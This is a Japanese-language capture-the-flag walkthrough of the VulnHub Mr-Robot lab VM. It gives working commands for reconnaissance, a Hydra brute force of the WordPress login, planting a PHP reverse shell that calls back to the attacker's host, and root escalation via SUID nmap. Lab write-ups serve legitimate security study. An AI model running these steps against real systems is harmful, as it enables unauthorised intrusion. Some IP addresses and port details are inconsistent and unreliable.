1.Mr-robotのIPアドレスを特定する（今回はarp-scan）
```bash
sudo arp-scan -l
```
```
Interface: enp0s3, type: EN10MB, MAC: 08:00:27:39:c7:bb, IPv4: 192.168.56.101
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:0a	(Unknown: locally administered)
192.168.56.100	08:00:27:0d:df:51	PCS Systemtechnik GmbH
192.168.56.114	08:00:27:e2:32:c5	PCS Systemtechnik GmbH
```

2.疎通確認
```bash
sudo ping 192.168.56.114
```

3.実験用ディレクトリの作成
```bash
cd vulnhub/
mkdir mr-robot
cd mr-robot/
```

4.ポートスキャンする
```bash
sudo nmap -sS -A 192.168.56.120 --system-dns -oX scan.xml
```
```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:BC:54:D9 (Oracle VirtualBox virtual NIC)
```
|  |  |
|-----------|---------|
| -sS | デフォルトカテゴリのスクリプトでスキャン |
| -A | OSとサービスの詳細表示|
| --system-dns | システムのDNSリゾルバを使う |
| -oX | スキャン結果をXMLファイルにも出力する |

**22,80,443**が開いていた
5.Webスクリーンショットの連続撮影（EyeWitnessツール使用）
```bash
eyewitness -x scan.xml --web
```
<img width="1122" height="454" alt="image" src="https://github.com/user-attachments/assets/ade47c43-ee22-403a-ac0a-b847b9c40386" />
`http://192.168.56.120`
を押す

6.HTTPアクセスする
<img width="1391" height="513" alt="image" src="https://github.com/user-attachments/assets/00061872-acfe-4161-af38-ff80b4ee7c6a" />

これらのコマンドのみが使えるサイト
prepare：動画が再生
fsociety：メッセージ表示
inform：記事のスクラップとMr.Robotからのメッセージ
question：画像が表示
wakeup：動画が再生
join：入会案内
help：使用できるコマンドの一覧表示

7.ブログにアクセスする

`http://192.168.56.120` ⇒　さっきのコマンドどれ指定しても同じページに移行した

<img width="1397" height="691" alt="image" src="https://github.com/user-attachments/assets/c199df23-559a-434d-9575-aeee7383b06b" />
ページのソースを確認（いくつかのディレクトリらしきものがみられる）
<img width="1401" height="696" alt="image" src="https://github.com/user-attachments/assets/d9a31c2b-4072-4f73-be6b-3d61090fc74c" />

8.robots.txtにアクセスしてみる

`http://192.168.56.120/robots.txt`

２つファイルを発見
<img width="1175" height="312" alt="image" src="https://github.com/user-attachments/assets/9d1b07cb-c7e5-49a1-82e2-edbc3c0bda6b" />

9.怪しいURLにアクセスする

`wget http://192.168.56.120/key-1-of-3.txt`
`wget http://192.168.56.120/fsociety.dic`

ダウンロードしたファイルをcatで開く
fsociety.dicが大きいのでパスワード候補に重複がないか確かめる
```bash
$sort fsocity.dic | uniq -c
75 000
75 000000
75 000080
75 001
75 002
75 003
75 0032
75 003s
ーーーーーーーーーーー　（　略　）ーーーーーーーーーーーーーーー
※全部のワードが７５ずつ重複しているのを確認
```
重複を省いたパスワードファイルを作成する
```bash
cat fsociety.dic | sort | uniq > filter_fsociety.dic
```
10.HTTPサービスの情報を収集する
```bash
nikto -h http://192.168.56.120:80
```
```
Nikto v2.5.0

---

Target IP: 192.168.56.114

Target Hostname: 192.168.56.114

Target Port: 80

Start Time: 2026-01-03 10:26:45 (GMT9)

---

Server: Apache

/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/

/esE7X7bk.cfm: Retrieved x-powered-by header: PHP/5.5.29.

No CGI Directories found (use '-C all' to force check all possible dirs)

/index: Uncommon header 'tcn' found, with contents: list.

/index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275

/admin/: This might be interesting.　　　　←　怪しい

/readme: This might be interesting.　　　　←　怪しい

/image/: Drupal Link header found with value: http://192.168.56.114/?p=23; rel=shortlink. See: https://www.drupal.org/

/wp-links-opml.php: This WordPress script reveals the installed version.

/license.txt: License file found may identify site software.　　　←　怪しい

/admin/index.html: Admin login page/section found.　　　　　←　怪しい

/wp-login/: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies　　←　怪しい

/wp-login/: Admin login page/section found.

/wordpress/: A Wordpress installation was found.　　　　　　　　←　怪しい

/wp-admin/wp-login.php: Wordpress login found.

/wordpress/wp-admin/wp-login.php: Wordpress login found.

/blog/wp-login.php: Wordpress login found.

/wp-login.php: Wordpress login found.

/wordpress/wp-login.php: Wordpress login found.

/#wp-config.php#: #wp-config.php# file found. This file contains the credentials.

8102 requests: 0 error(s) and 19 item(s) reported on remote host

End Time: 2026-01-03 10:29:42 (GMT9) (177 seconds)

---

1 host(s) tested
```
```
http://192.168.56.120/admin/index.html

##################中身（ページソース）###################
<!doctype html>
<!--
\   //~~\ |   |    /\  |~~\|~~  |\  | /~~\~~|~~    /\  |  /~~\ |\  ||~~
 \ /|    ||   |   /__\ |__/|--  | \ ||    | |     /__\ | |    || \ ||--
  |  \__/  \_/   /    \|  \|__  |  \| \__/  |    /    \|__\__/ |  \||__
-->
<html class="no-js" lang="">
  <head>
    

    <link rel="stylesheet" href="css/A.main-600a9791.css.pagespeed.cf.6PBOtigNA6.css">

    <script src="js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js"></script>

    <script>var USER_IP='208.185.115.6';var BASE_URL='index.html';var RETURN_URL='index.html';var REDIRECT=false;window.log=function(){log.history=log.history||[];log.history.push(arguments);if(this.console){console.log(Array.prototype.slice.call(arguments));}};</script>

  </head>
  <body>
    <!--[if lt IE 9]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    

    <!-- Google Plus confirmation -->
    <div id="app"></div>

    
    <script src="js/s_code.js.pagespeed.jm.I78cfHQpbQ.js"></script>
    <script src="js/main-acba06a5.js.pagespeed.jm.YdSb2z1rih.js"></script>
</body>
</html>
```
http://192.168.56.114/license.txt

ページがスクロールできる

一番下にエンコード文字列を発見
```
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?

do you want a password or something?

ZWxsaW90OkVSMjgtMDY1Mgo=
```

※デコードする
```bash
echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 --decode
```
`elliot:ER28-0652` 　ユーザ：パスワード

`http://192.168.56.120/wp-login.php`
<img width="1401" height="768" alt="image" src="https://github.com/user-attachments/assets/910ebe33-df15-41a3-8c79-0752ec2d4724" />
<img width="356" height="506" alt="image" src="https://github.com/user-attachments/assets/67a95fda-81f6-49d0-a49e-54955707a5b1" />

F12でデベロッパーツールを使用（Networkタブ）＞All＞RequestでRawを選択
<img width="1392" height="301" alt="image" src="https://github.com/user-attachments/assets/05f1cf22-83f9-4de4-85ef-58c45fbc7091" />
<img width="1396" height="735" alt="image" src="https://github.com/user-attachments/assets/a85718f7-074c-48af-971f-0dd5bf2f0623" />

ログイン成功

11.Burpで認証時のHTTPリクエストを調べる
まず、Proxy＞Intercept＞Intercept is off　にしておく

Burpで不具合。

認証画面から始める（Intercept is on）

１．ユーザー「test」パスワード「test」で実行　⇒　HTTPリクエストをみる

２．forwardボタンをおす　⇒　ERROR:Invaild usernameが返ってくる

３．testユーザーというものは存在しない　

12.オンラインパスワードクラッカーでフォーム認証を攻撃する

  Hydraを使用
  
  まず狙うのはユーザ名の特定（使用するワードファイルは作成したfilterd\fsociety.dic）

- testユーザー
- -L：ユーザー名リストを指定
- -p：パスワードを指定
```bash
#作業ディレクトリのfilter_fsocity.dicを使用するため階層は変えておく
hydra 192.168.56.120 -l elliot -P ./filter_fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.120%2Fwp-admin%2F&testcookie=1:Invalid username"
```
→　みつからず

- elliot1ユーザー
- -l：ユーザを指定
- -P：パスワード候補リストを指定

is correctを指定
```bash
hydra 192.168.56.120 -l elliot -P ./filter_fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.120%2Fwp-admin%2F&testcookie=1:is incorrect"
```
パスワードを発見
```bash
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 17:50:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://192.168.56.120:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.120%2Fwp-admin%2F&testcookie=1:is incorrect
[STATUS] 1247.00 tries/min, 1247 tries in 00:01h, 10205 to do in 00:09h, 16 active
[STATUS] 1287.67 tries/min, 3863 tries in 00:03h, 7589 to do in 00:06h, 16 active
[80][http-post-form] host: 192.168.56.120   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 17:53:41
```
13.PHPのリバースシェルを設置する
- gitから入手したリバースシェル使用(Nortonにはじかれるので未記載)
  
```
#４９行目と５０行目を変更
$ip = '127.0.0.1';  // CHANGE THIS　⇒　$ip = '192.168.56.101'; 
$port = 1234;      // CHANGE THIS　⇒　$port = 5555; 
```
14.elliotでログインし、ダッシュボードでメニューの「Appearance」＞「Editor」＞「404 Template」を選択、バックアップをとる

バックアップをとったら編集したphp-reverse-shell.phpをはりつける

⇒　Update File を押す
<img width="1398" height="808" alt="image" src="https://github.com/user-attachments/assets/04f8bc03-5c4d-4900-8f99-057497bae5d6" />

※変更後
<img width="1148" height="514" alt="image" src="https://github.com/user-attachments/assets/1b29bb3d-a814-41f6-b0d5-05df7ce0e125" />

15.リバースシェルの待ち受け状態を作る

`nc -nlvp 5555`

16.リバースシェルのセッションを確立させる

ブラウザでわざと404ページをよびだすのでもOK（今回はcurlを使う）

`curl -X POST http://192.168.56.120:80//404.php`
<img width="876" height="331" alt="image" src="https://github.com/user-attachments/assets/7d328179-eafc-4149-bcae-48ae28a672e4" />

17.対話的シェルを奪取する

　pythonのptyモジュールを用いてTTYシェルを奪取する
```
python -c "import pty; pty.spawn('/bin/bash')”
```
　<img width="857" height="88" alt="image" src="https://github.com/user-attachments/assets/6d8c7a5c-921a-4334-b8ab-ced27e9cfb03" />

18.システム内を探索する

robotユーザのパスワードハッシュを発見
key-2-of-3.txtは今のユーザーに権限がないらしい
<img width="892" height="679" alt="image" src="https://github.com/user-attachments/assets/e83cd43d-a258-455d-ac73-9b44a90489ab" />

19.オンラインでハッシュ値をクラックする

今回しようするのはCrackStation

robot : abcdefghijklmnopqrstuvwxyz
<img width="891" height="329" alt="image" src="https://github.com/user-attachments/assets/a4ca4f43-6bbe-482f-9e72-2c21adb21f66" />

20. 別のユーザーに切り替える
   ```bash
    daemon@linux:/home/robot$ su robot
    su robot
    Password: abcdefghijklmnopqrstuvwxyz
    
    robot@linux:~$ ls
    ls
    key-2-of-3.txt	password.raw-md5
    robot@linux:~$ cat key-2-of-3.txt
    cat key-2-of-3.txt
    822c73956184f694993bede3eb39f959`
   ```

21.SUIDファイルを検索する
```bash
robot@linux:~$ find / -type f -perm -u=s 2> /dev/null
```
<img width="872" height="586" alt="image" src="https://github.com/user-attachments/assets/dfcd867d-5c54-4f59-befc-078bbba7e82c" />

21. SUIDファイルであるnmapを利用してrootユーザへの昇格を試みる

```bash
robot@linux:~$ nmap --interactive
nmap> h　←　ヘルプ表示
```
！を先頭につけることでコマンド入力される
```bash
nmap> !id
!id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
waiting to reap child : No child processes
nmap> !sh
!sh 
#
``` 
昇格したら最後のカギを探す

先頭に見えないゴミがあるときがあるのでCtrl＋Uしてからコマンド入力
<img width="744" height="569" alt="image" src="https://github.com/user-attachments/assets/78cb7630-e8b5-460e-9c22-6315f7ef842c" />
